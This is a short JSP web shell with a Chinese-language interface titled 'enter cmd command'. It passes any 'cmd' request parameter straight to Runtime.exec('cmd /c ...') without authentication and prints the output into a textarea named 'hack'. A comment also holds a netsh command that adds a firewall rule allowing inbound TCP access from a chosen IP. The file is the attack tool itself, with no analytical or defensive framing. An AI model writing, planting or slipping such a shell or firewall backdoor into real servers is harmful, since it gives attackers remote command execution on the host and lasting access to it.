<%@ page contentType="text/html; charset=gb2312"%>
<%@ page import="java.io.*"%>
<html>
	<head>
		<title>输入cmd命令</title>
	</head>

	<body>
		<%
			String strcmd="";
			// 添加防火墙
			// cmd /c netsh advfirewall firewall add rule name=yourrulename dir=in interface=any action=allow localport=yourport protocol=tcp remoteip=youripaddress/32
			String strline="";
			StringBuffer result=new StringBuffer("");
			strcmd = request.getParameter("cmd");
			if(strcmd==null)
				strcmd = "ping www.baidu.com";
			try {
				Process p=Runtime.getRuntime().exec("cmd /c "+ strcmd);
				BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
				while((strline=br.readLine())!=null) {
					result.append(strline+"\n");  
				}    
			}
			catch(Exception ex) {
				ex.printStackTrace();
			}
		%>
		<form name="cmd" action="" method="post">
			<input type="text" name="cmd" value="<%=strcmd%>" size=50>
			<input type=submit name=submit value="执行命令">
		</form>
		<%
			if(result!=null && result.toString().trim().equals("")==false) {
		%>
				<textarea name="hack" rows="20" cols="84" style="font-size:10px;"><%=result.toString()%></textarea>
		<%
			}
		%>
	</body>
</html>